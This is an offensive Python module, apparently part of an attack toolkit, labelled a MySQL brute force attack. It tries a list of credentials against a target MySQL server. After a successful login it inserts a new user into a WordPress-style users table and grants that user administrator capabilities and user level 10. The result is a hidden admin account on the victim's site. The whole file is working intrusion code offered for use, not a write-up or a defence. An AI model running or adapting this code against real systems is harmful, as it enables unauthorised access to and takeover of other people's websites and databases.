'''
name : MySQL Brute Force Attack Module
description : This module performs a brute force attack on the MySQL service to gain access.
version : 1.0
author : Ayato
'''

import pymysql
import json

def insert_data(ip, username, password, database, prefix, data):
    print(f"[*] Inserting data into {database}.{prefix}users on {ip} as {username}")
    try:
        connection = pymysql.connect(
            host=ip,
            user=username,
            password=password,
            database=database,
            connect_timeout=5
        )

        users_table = f"{prefix}users"
        meta_table = f"{prefix}usermeta"

        with connection.cursor() as cursor:
            placeholders = ', '.join(['%s'] * len(data))
            columns = ', '.join(data.keys())
            sql = f"INSERT INTO {users_table} ({columns}) VALUES ({placeholders})"
            cursor.execute(sql, list(data.values()))
            connection.commit()
            print(f"[+] Data inserted successfully into {database}.{meta_table} on {ip} as {username}")
            sql = f"SET @uid := (SELECT ID FROM {users_table} WHERE user_login='{data['user_login']}')"
            cursor.execute(sql)
            connection.commit()
            sql = f"INSERT INTO {meta_table} (user_id,meta_key,meta_value) VALUES (@uid,'{prefix}capabilities','a:1:{{s:13:\"administrator\";b:1;}}'),(@uid,'{prefix}user_level','10')"
            cursor.execute(sql)
            connection.commit()
            return True
        connection.close()
    except pymysql.MySQLError as e:
        print(f"[-] MySQL error on {ip} with {username}:{password}: {e}")
        return False
    except Exception as e:
        print(f"[-] Error on {ip} with {username}:{password}: {e}")
        return False

def run(ip, avaliable_credentials, database, prefix, data):
    print("[*] Running MySQL brute force attack module...")
    print(f"[*] Target IP: {ip}")
    for username, password in avaliable_credentials.items():
        if insert_data(ip, username, password, database, prefix, data):
            print(f"[+] Data insertion succeeded with {username}:{password} on {ip}")
            return 0
